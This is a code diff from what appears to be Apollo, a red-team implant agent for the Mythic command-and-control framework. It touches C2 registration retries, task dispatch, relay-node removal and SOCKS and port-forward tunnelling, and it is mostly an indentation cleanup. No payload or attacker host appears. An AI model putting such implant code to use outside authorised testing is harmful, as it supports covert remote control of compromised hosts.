@@ -23,6 +23,7 @@
 
 
 using System;
+using System.IO;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Threading;
@@ -160,71 +161,71 @@ namespace Apollo
                 if (node.NodeRelay.IsActive() && !node.TemporaryUUID)
                 {
                     node.NodeRelay.StopAllThreads = true;
-                    while (node.NodeRelay.IsActive())
-                    {
-                        Thread.Sleep(500);
-                    }
-                }
-                DelegateNodesMutex.WaitOne();
-                DelegateNodes.Remove(uuid);
-                DelegateNodesMutex.ReleaseMutex();
-                AS.EdgeNode en = new AS.EdgeNode()
-                {
-                    source = this.uuid,
-                    destination = node.AgentUUID,
-                    direction = 1, // from source to dest
-                    metadata = "",
-                    action = "remove",
-                    c2_profile = node.ProfileInfo.name
-                };
-                if (!node.TemporaryUUID)
-                {
-                    var response = new ApolloTaskResponse()
-                    {
-                        task_id = node.OriginatingTaskID,
-                        completed = true,
-                        user_output = $"Lost link to {node.AgentComputerName} (Agent UUID: {node.AgentUUID})",
-                        status = "error",
-                        edges = new AS.EdgeNode[] { en }
-                    };
-                    
-                    try
-                    {
-                        Profile.SendResponse(node.OriginatingTaskID, response);
-                    }
-                    catch (Exception ex)
-                    {
-                        DebugWriteLine($"Error sending node removal message to server. Reason: {ex.Message}\n\tStackTrack: {ex.StackTrace}");
-                    }
-                }
-            }
-        }
+		    while (node.NodeRelay.IsActive())
+		    {
+			    Thread.Sleep(500);
+		    }
+		}
+		DelegateNodesMutex.WaitOne();
+		DelegateNodes.Remove(uuid);
+		DelegateNodesMutex.ReleaseMutex();
+		AS.EdgeNode en = new AS.EdgeNode()
+		{
+			source = this.uuid,
+			       destination = node.AgentUUID,
+			       direction = 1, // from source to dest
+			       metadata = "",
+			       action = "remove",
+			       c2_profile = node.ProfileInfo.name
+		};
+		if (!node.TemporaryUUID)
+		{
+			var response = new ApolloTaskResponse()
+			{
+				task_id = node.OriginatingTaskID,
+					completed = true,
+					user_output = $"Lost link to {node.AgentComputerName} (Agent UUID: {node.AgentUUID})",
+					status = "error",
+					edges = new AS.EdgeNode[] { en }
+			};
 
-        private static string GetOSVersion()
-        {
-            return Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", "").ToString() + " " + Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ReleaseId", "");
-        }
+			try
+			{
+				Profile.SendResponse(node.OriginatingTaskID, response);
+			}
+			catch (Exception ex)
+			{
+				DebugWriteLine($"Error sending node removal message to server. Reason: {ex.Message}\n\tStackTrack: {ex.StackTrace}");
+			}
+		}
+	    }
+	}
 
-        /// <summary>
-        /// Function responsible for kicking off the
-        /// registration sequence for the agent to connect
-        /// back to the primary Apfell Server specified by
-        /// the given C2 Profile.
-        /// </summary>
-        /// <returns>TRUE if the agent was sucessfully registered with the server, FALSE otherwise.</returns>
-        public bool InitializeAgent()
-        {
-            int retryCount = 0;
-            // If we didn't get success, retry and increment counter
-            while (retryCount < MAX_RETRIES)
-            {
-                try
-                {
-                    //DebugWriteLine($"Attempting to initialize agent. Attempt {retryCount}");
-                    string newUUID = Profile.RegisterAgent(this);
-                    uuid = newUUID;
-                    retryCount = 0;
-                    IsActive = true;
+	private static string GetOSVersion()
+	{
+		return Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName", "").ToString() + " " + Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ReleaseId", "");
+	}
+
+	/// <summary>
+	/// Function responsible for kicking off the
+	/// registration sequence for the agent to connect
+	/// back to the primary Apfell Server specified by
+	/// the given C2 Profile.
+	/// </summary>
+	/// <returns>TRUE if the agent was sucessfully registered with the server, FALSE otherwise.</returns>
+	public bool InitializeAgent()
+	{
+		int retryCount = 0;
+		// If we didn't get success, retry and increment counter
+		while (retryCount < MAX_RETRIES)
+		{
+			try
+			{
+				//DebugWriteLine($"Attempting to initialize agent. Attempt {retryCount}");
+				string newUUID = Profile.RegisterAgent(this);
+				uuid = newUUID;
+				retryCount = 0;
+				IsActive = true;
                     return true;
                 } 
                 catch (Exception ex)
@@ -315,17 +316,14 @@ namespace Apollo
 
         public void DispatchTaskQueue(Mythic.Structs.TaskQueue tasks)
         {
-
             if (tasks.SocksDatagrams != null && tasks.SocksDatagrams.Length > 0)
             {
                 DispatchSocksDatagrams(tasks.SocksDatagrams);
             }
-
             if (tasks.PortFwdDg != null && tasks.PortFwdDg.Length > 0)
-            {
+            {    
                 DispatchPortFwdDatagrams(tasks.PortFwdDg);
             }
-
             if (tasks.Tasks.Length != 0)
             {
                 DebugWriteLine($"Received {tasks.Tasks.Length} new tasks to execute.");
@@ -338,7 +336,7 @@ namespace Apollo
                 DebugWriteLine($"Received {tasks.Delegates.Length} new delegate messages to pass.");
                 DispatchDelegates(tasks.Delegates);
             }
-        }
+	}
 
 
         /// <summary>
@@ -361,16 +359,15 @@ namespace Apollo
                     relayThread.Start();
                     while (IsActive)
                     {
-                        DebugWriteLine("------ NEW LOOP ------");
+			DebugWriteLine("------ NEW LOOP ------");
                         Stopwatch sw = new Stopwatch();
                         sw.Start();
                         // Need to parse delegates and tasks from checktasking (which should be renamed)
                         new Thread(()=>SendTaskOutput()).Start();
                         Mythic.Structs.TaskQueue tasks = CheckTasking();
-
                         Stopwatch sw2 = new Stopwatch();
                         sw2.Start();
-                        new Thread(() => DispatchTaskQueue(tasks)).Start();
+			new Thread(() => DispatchTaskQueue(tasks)).Start();
                         sw2.Stop();
                         DebugWriteLine($"Took {FormatTimespan(sw2.Elapsed)} to start DispatchTaskQueue thread.");
                         //DebugWriteLine("~~~~~~~~~~~~~~~ Started main task dispatch!");
@@ -386,18 +383,19 @@ namespace Apollo
 
         private void SendTaskOutput()
         {
-            int retryCount = 0;
+	    int retryCount = 0;
             Tasks.ApolloTaskResponse[] responses = JobManager.GetJobOutput();
-            PortFwdDatagram[] rdatagrams = RPortFwdController.GetMythicMessagesFromQueue();
-            SocksDatagram[] datagrams = SocksController.GetMythicMessagesFromQueue();
+	    PortFwdDatagram[] rdatagrams = null;
+	    rdatagrams = RPortFwdController.GetMythicMessagesFromQueue();
+	    SocksDatagram[] datagrams = SocksController.GetMythicMessagesFromQueue();
             List<ApolloTaskResponse> lResponses = new List<ApolloTaskResponse>(); // probably should be used to resend
-            if (responses.Length > 0 || datagrams.Length > 0 || rdatagrams.Length > 0)
+	    if (responses.Length > 0 || datagrams.Length > 0 || rdatagrams != null)
             {
                 string guid = Guid.NewGuid().ToString();
                 while (retryCount < MAX_RETRIES)
                 {
                     string result = Profile.SendResponses(guid, responses, datagrams,rdatagrams);
-                    if (string.IsNullOrEmpty(result))
+	            if (string.IsNullOrEmpty(result))
                     {
                         break;
                     }
@@ -419,7 +417,7 @@ namespace Apollo
                     retryCount += 1;
                     if (responses.Length == 0)
                         break;
-                }
+		}
             }
         }
 
@@ -678,7 +676,7 @@ namespace Apollo
                     // tasks = results[0]
                     // delegates = results[1]
                     // return (tasks, delegates)
-                    //DebugWriteLine("~~~~~~~~~~~~~~~ Attempting to fetch new tasks...");
+                    //DebugWriteLine("~~~~~~~~~~~~~~~ Attempting to fetch new tasks..."); 
                     tasks = Profile.GetMessages(this);
                     //DebugWriteLine("~~~~~~~~~~~~~~~ Successfully fetched new tasks!");
                     break;
